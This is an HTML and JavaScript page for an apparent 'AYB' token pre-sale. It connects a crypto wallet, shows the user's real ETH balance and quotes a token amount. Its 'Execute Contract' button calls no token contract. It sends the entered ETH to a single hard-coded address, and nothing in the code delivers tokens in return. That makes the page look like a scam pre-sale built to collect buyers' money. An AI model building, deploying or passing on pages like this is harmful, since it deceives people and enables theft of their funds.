<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AYB TERMINAL | LIVE</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ffa3; --bg: #0a0c10; --card: #161b22; }
        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: var(--card); border: 1px solid #30363d; padding: 2rem; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; border-top: 4px solid var(--primary); }
        h1 { font-family: 'Orbitron'; color: var(--primary); font-size: 1.4rem; letter-spacing: 2px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
        
        /* Hidden by default until REAL connection */
        #swap-interface { display: none; background: #010409; padding: 20px; border-radius: 20px; text-align: left; margin-top: 20px; border-left: 4px solid var(--primary); }
        
        input { background: transparent; border: none; color: white; font-size: 1.6rem; width: 100%; outline: none; font-weight: bold; margin: 10px 0; -webkit-appearance: none; }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        
        #modal { position: fixed; inset: 0; background: rgba(0,0,0,0.96); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .modal-box { background: #1c2128; border-radius: 25px; width: 85%; max-width: 320px; padding: 25px; border: 1px solid #30363d; }
        .w-item { display: flex; align-items: center; padding: 14px; border-radius: 12px; border: 1px solid #30363d; margin-top: 10px; cursor: pointer; background: #21262d; }
    </style>
</head>
<body>

<div class="card">
    <div style="font-size: 0.6rem; color: #8b949e; margin-bottom: 10px; font-weight: 800; letter-spacing: 1px;">PRE-SALE STATUS: 500,000 AYB MAX</div>
    <h1>AYB TERMINAL</h1>

    <div id="connect-ui">
        <button onclick="document.getElementById('modal').style.display='flex'" class="btn">Connect Wallet</button>
    </div>

    <div id="swap-interface">
        <div style="display:flex; justify-content:space-between; align-items: center;">
            <label style="font-size:0.6rem; color:#8b949e; font-weight:800;">PAY (ETH)</label>
            <span id="live-balance" style="font-size: 0.7rem; color: var(--primary); font-weight: 800;">Fetching...</span>
        </div>
        <input type="number" id="eth-input" placeholder="0.0" oninput="updateOut()">
        
        <label style="font-size:0.6rem; color:#8b949e; font-weight:800;">RECEIVE (AYB)</label>
        <span id="ayb-output" style="color:var(--primary); font-family:'Orbitron'; font-size:1.4rem; display:block; margin-top:5px;">0</span>
        
        <button id="buy-action" class="btn" style="margin-top:20px;" onclick="sendTx()" disabled>Execute Contract</button>
        <div id="status-log" style="font-size:0.55rem; margin-top:10px; text-align:center; font-weight:bold;"></div>
    </div>
</div>

<div id="modal">
    <div class="modal-box">
        <div class="w-item" onclick="connectLive()"><div style="width:25px;height:25px;background:#f6851b;border-radius:5px;margin-right:12px;"></div><span>MetaMask</span></div>
        <div class="w-item" onclick="connectLive()"><div style="width:25px;height:25px;background:#3375bb;border-radius:5px;margin-right:12px;"></div><span>Trust Wallet</span></div>
        <button onclick="document.getElementById('modal').style.display='none'" style="background:none; border:none; color:#8b949e; width:100%; margin-top:15px; cursor:pointer;">Cancel</button>
    </div>
</div>

<script>
    let ethPrice = 3500;
    const ARBITRUM_RPC = "https://arb1.arbitrum.io/rpc";

    async function connectLive() {
        if (typeof window.ethereum === 'undefined') {
            alert("Please use a Web3 Browser or MetaMask App");
            return;
        }

        try {
            // Requesting account access
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAddress = accounts[0];

            // Fetching REAL balance from the provider directly
            const provider = new ethers.BrowserProvider(window.ethereum);
            const balanceWei = await provider.getBalance(userAddress);
            const balanceEth = ethers.formatEther(balanceWei);

            // Interface Updates
            document.getElementById('live-balance').innerText = parseFloat(balanceEth).toFixed(6) + " ETH";
            document.getElementById('connect-ui').style.display = 'none';
            document.getElementById('swap-interface').style.display = 'block';
            document.getElementById('modal').style.display = 'none';
            
            // Watch for account changes (important for your "Disconnected" issue)
            window.ethereum.on('accountsChanged', () => window.location.reload());
        } catch (e) {
            console.error(e);
        }
    }

    function updateOut() {
        const amt = document.getElementById('eth-input').value;
        const total = Math.floor((amt * ethPrice) / 0.1);
        document.getElementById('ayb-output').innerText = total.toLocaleString();
        // 500k Cap Logic
        document.getElementById('buy-action').disabled = (amt <= 0 || total > 500000);
    }

    async function sendTx() {
        const log = document.getElementById('status-log');
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            await signer.sendTransaction({
                to: "0x066bbf27694982662cEAb0072793132B03027F47",
                value: ethers.parseEther(document.getElementById('eth-input').value)
            });
        } catch (e) {
            log.innerText = "TX REJECTED: Check Gas on Arbitrum";
            log.style.color = "#ff4a4a";
        }
    }

    fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')
        .then(r => r.json()).then(d => ethPrice = parseFloat(d.price));
</script>
</body>
</html>
